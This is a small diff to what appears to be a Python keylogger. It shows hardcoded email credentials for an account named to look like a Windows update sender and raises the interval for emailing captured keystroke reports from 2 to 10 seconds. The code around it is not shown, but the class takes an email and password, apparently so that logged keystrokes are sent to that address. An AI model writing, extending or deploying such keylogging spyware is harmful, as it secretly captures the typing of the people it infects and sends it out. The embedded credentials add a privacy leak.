@@ -15,7 +15,7 @@ from email.mime.text import MIMEText
 # Email configuration
 EMAIL_ADDRESS = "winsupdate00@outlook.com"
 EMAIL_PASSWORD = "Logger1@12"
-SEND_REPORT_EVERY = 2  # as in seconds
+SEND_REPORT_EVERY = 10  # as in seconds
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
